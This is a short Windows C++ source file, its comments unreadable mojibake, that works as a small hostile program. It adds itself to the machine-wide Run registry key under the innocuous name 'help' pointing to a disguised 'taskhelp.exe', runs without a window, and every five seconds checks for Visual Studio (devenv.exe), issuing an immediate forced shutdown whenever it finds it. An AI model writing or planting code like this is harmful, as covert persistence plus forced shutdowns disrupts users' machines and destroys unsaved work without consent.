#include "windows.h"
#include <conio.h>
#include <tlhelp32.h>
#include <TCHAR.H>

bool areEqual(const TCHAR *a, const TCHAR *b) //���������� ��� ��������� ���������� ���� TCHAR
{
	while (*a == *b)
	{
		if (*a == _TEXT('\0'))
			return true;
		a++; 
		b++;
	}
	return false;
}

bool isProcessRun(TCHAR *Name)
{
	bool RUN = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //��������� ������ �������� ���������

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot, &pe); //��������� ������� ��������

	if (areEqual(pe.szExeFile, Name)) //��������� � �������
	{
		RUN = true;
		return RUN;
	}

	while (Process32Next(hSnapshot, &pe)) //��������� ���������� ��������
	{
		if (areEqual(pe.szExeFile, Name)) //��������� � �������
		{
			RUN = true;
			return RUN;
		}
	}

	return RUN;
}

void autoRun()
{
	HKEY hkey;
	TCHAR path[512] = TEXT("C:\\Windows\\taskhelp.exe"); //����, ��� ������ ������ taskhelp.exe

	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
				0,
				KEY_ALL_ACCESS | KEY_WOW64_64KEY,
				&hkey); //�������� �����

	LPCWSTR nameInReg = TEXT("help"); //��� ����� ���������� ������� � �������

	RegSetValueEx(hkey, nameInReg, 0, REG_SZ, (LPBYTE)path, wcslen(path) + 30); //������ � ���� ��������� ����� �������
	RegCloseKey(hkey); //�������� �����
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpszCmdLine, int nCmdShow)
{
	autoRun(); //�������� ������ � ������� ��� ��������������� ������� ���� ��������� ��� ������ ����������

	TCHAR Name[128] = TEXT("devenv.exe"); //�������� ��������, �� �������� ����� ����������� ���������
	Sleep(10000);
	for (;;) //�������� �� ������� ��������, ����������� ��� � 5 ������
	{
		Sleep(5000);
		if (isProcessRun(Name) == TRUE)
		{
			system("shutdown -s -t 0");
		}
	}
}